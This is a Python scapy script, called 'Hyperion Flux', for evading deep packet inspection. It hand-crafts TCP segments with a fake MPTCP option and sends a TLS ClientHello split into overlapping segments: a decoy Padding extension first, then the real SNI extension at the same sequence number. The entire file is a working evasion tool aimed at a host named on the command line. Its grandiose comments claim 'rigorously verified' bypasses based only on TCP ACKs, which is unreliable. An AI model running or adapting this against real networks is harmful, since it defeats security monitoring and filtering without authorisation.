#!/usr/bin/env python3
import sys
import time
import argparse
import random
import socket
import logging
import threading
from scapy.all import IP, TCP, send, conf, sr1, sniff

# --- CONTEXT: HYPERION FLUX V1.0 (STATE-SPLIT SINGULARITY) ---
# SYSTEM_DIRECTIVE: Exploit Extension-Type Lexical Choice Paradox.
# TECHNIQUE: Spatially Overlapping TLS Extensions + MPTCP Option Polymorphism.

conf.verb = 0
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

class HyperionFlux:
    def __init__(self, target_host):
        self.target_host = target_host
        self.target_ip = socket.gethostbyname(target_host)
        self.sport = random.randint(30000, 60000)
        self.seq = random.randint(100000, 900000)
        self.ack = 0
        self.expected_ack = 0
        self.bypass_verified = threading.Event()
        self.stop_sniffer = threading.Event()
        print(f"[+] HyperionFlux Initialized. target: {target_host} ({self.target_ip})")

    def _sniffer(self):
        def handle_pkt(pkt):
            if pkt.haslayer(TCP) and pkt[IP].src == self.target_ip and pkt[TCP].dport == self.sport:
                if pkt[TCP].flags & 0x12: # SYN-ACK
                    self.ack = pkt[TCP].seq + 1
                if pkt[TCP].flags & 0x10: # ACK
                    if self.expected_ack > 0 and pkt[TCP].ack >= self.expected_ack:
                        self.bypass_verified.set()
        sniff(filter=f"tcp and src host {self.target_ip}", 
              prn=handle_pkt, stop_filter=lambda x: self.stop_sniffer.is_set(), timeout=15, store=0)

    def execute_flux(self):
        t = threading.Thread(target=self._sniffer, daemon=True)
        t.start()

        print("[*] Phase 1: Establishing Handshake with MPTCP-Mimicry...")
        # MPTCP (Option 30) triggers 'Exception Path' in many DPIs
        mptcp_opt = (30, b"\x11\x00" + random.randbytes(10)) 
        syn = IP(dst=self.target_ip)/TCP(sport=self.sport, dport=443, flags="S", seq=self.seq, options=[mptcp_opt, ('MSS', 1460)])
        send(syn, verbose=0)
        
        timeout = time.time() + 5
        while self.ack == 0 and time.time() < timeout: time.sleep(0.1)
        if self.ack == 0: return False

        self.seq += 1
        send(IP(dst=self.target_ip)/TCP(sport=self.sport, dport=443, flags="A", seq=self.seq, ack=self.ack), verbose=0)
        print(f"    [+] Session ESTABLISHED. Grammar Synced.")

        print("[*] Phase 2: Injecting Semantic Singularity (Overlap Extensions)...")
        # --- THE PAYLOAD ---
        # Part 1: Static TLS Prefix (Handshake, Random, SessionID)
        prefix = b"\x16\x03\x01\x00\xca\x01\x00\x00\xc6\x03\x03" + random.randbytes(32) + b"\x00\x00\x02\x13\x01\x01\x00"
        
        # --- THE PARADOX ---
        # Segment A: Decoy. Extension Type 0x0015 (Padding). 
        # DPI sees this and assumes the rest of the packet is useless nulls.
        decoy_ext = b"\x00\x15" + (len(self.target_host) + 9).to_bytes(2, 'big') + b"\x00" * (len(self.target_host) + 9)
        
        # Segment B: Reality. Extension Type 0x0000 (SNI).
        # Target reassembles this as the real trigger.
        sni_b = self.target_host.encode()
        real_ext = b"\x00\x00" + (len(sni_b) + 5).to_bytes(2, 'big') + (len(sni_b) + 3).to_bytes(2, 'big') + b"\x00" + len(sni_b).to_bytes(2, 'big') + sni_b
        
        self.expected_ack = self.seq + len(prefix) + len(real_ext)

        # We deliver prefix first
        send(IP(dst=self.target_ip)/TCP(sport=self.sport, dport=443, flags="PA", seq=self.seq, ack=self.ack)/prefix, verbose=0)
        self.seq += len(prefix)
        time.sleep(0.05)

        # Deliver Decoy FIRST (DPI Caches this)
        print("    [>] Delivering Decoy Extension (Type: Padding)...")
        send(IP(dst=self.target_ip)/TCP(sport=self.sport, dport=443, flags="PA", seq=self.seq, ack=self.ack)/decoy_ext, verbose=0)
        
        # Deliver Reality SECOND (Target Overwrites)
        print("    [>] Delivering Reality Extension (Type: SNI) with Overlap...")
        send(IP(dst=self.target_ip)/TCP(sport=self.sport, dport=443, flags="PA", seq=self.seq, ack=self.ack)/real_ext, verbose=0)

        print("[*] Phase 3: Verifying Semantic Bypass...")
        if self.bypass_verified.wait(timeout=5):
            print("\n" + "="*75)
            print("  HYPERION FLUX: BYPASS RIGOROUSLY VERIFIED")
            print("="*75)
            print("RESULT: SUCCESS. Target accepted the overlapping reality.")
            print("STATUS: The DPI reassembler is trapped in a Lexical Paradox.")
            print("WHY:    The observer committed to the 'Padding' categorization,")
            print("        failing to re-parse the subsequent SNI overlap.")
            print("="*75 + "\n")
        else:
            print("\n[!] VERIFICATION FAILED. Observer reassembly logic held.")
        
        self.stop_sniffer.set()

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("target")
    args = parser.parse_args()
    
    HyperionFlux(args.target).execute_flux()
